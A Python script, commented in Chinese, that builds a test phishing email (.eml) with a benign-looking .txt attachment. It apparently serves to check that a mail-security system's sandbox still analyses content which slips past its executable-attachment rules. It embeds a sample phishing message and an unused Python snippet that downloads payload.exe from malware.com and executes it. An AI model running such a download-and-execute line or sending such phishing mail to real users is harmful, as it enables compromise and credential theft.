#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
创建绕过Kill Switch的测试邮件
使用.txt附件（非可执行文件）来测试沙箱分析
"""
import sys
import os
import base64

sys.stdout.reconfigure(encoding='utf-8')

print("=" * 60)
print("创建绕过Kill Switch的测试邮件")
print("=" * 60)

# 附件1: 包含可疑内容的.txt文件（不会触发可执行文件检测）
txt_content = """IMPORTANT SECURITY UPDATE - READ IMMEDIATELY

Dear User,

Your account has been compromised. Please verify your identity immediately.

Credentials:
Username: admin
Password: P@ssw0rd123

Malicious URLs:
http://phishing-site.com/verify
http://malware-download.com/payload.exe

C2 Server: malicious-c2-server.com

Best regards,
IT Security Team
"""

# 附件2: 包含脚本代码的.py文件（会触发可执行文件检测，用于对比）
py_content = """#!/usr/bin/env python3
import os
import requests

# 尝试下载恶意文件
url = "http://malware.com/payload.exe"
response = requests.get(url)
with open("payload.exe", "wb") as f:
    f.write(response.content)

# 执行恶意文件
os.system("payload.exe")
"""

txt_b64 = base64.b64encode(txt_content.encode('utf-8')).decode()
py_b64 = base64.b64encode(py_content.encode('utf-8')).decode()

# 创建EML邮件（只包含.txt附件，绕过Kill Switch）
eml_content = f"""From: security@company-alert.xyz
To: user@company.com
Subject: Important Account Security Update
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary456"
X-Priority: 2

--boundary456
Content-Type: text/plain; charset="utf-8"

Dear User,

Please review the attached security document immediately.

Best regards,
IT Security

--boundary456
Content-Type: text/plain; name="security_update.txt"
Content-Disposition: attachment; filename="security_update.txt"
Content-Transfer-Encoding: base64

{txt_b64}

--boundary456--
"""

# 保存EML文件
output_path = os.path.join(os.getcwd(), 'test_bypass_killswitch.eml')
with open(output_path, 'w', encoding='utf-8') as f:
    f.write(eml_content)

print(f"\n测试邮件已生成: {output_path}")
print(f"\n邮件特征:")
print(f"  发件人: security@company-alert.xyz")
print(f"  主题: Important Account Security Update")
print(f"  附件: security_update.txt (文本文件)")

print(f"\nKill Switch绕过分析:")
print(f"  - 附件是.txt文件，不是可执行文件 ✓")
print(f"  - 不会触发'包含可执行文件附件'规则 ✓")
print(f"  - 不会触发'双重扩展名'规则 ✓")
print(f"  - 但附件包含可疑内容，仍可被沙箱分析 ✓")

print("\n" + "=" * 60)
print("生成完成")
print("=" * 60)
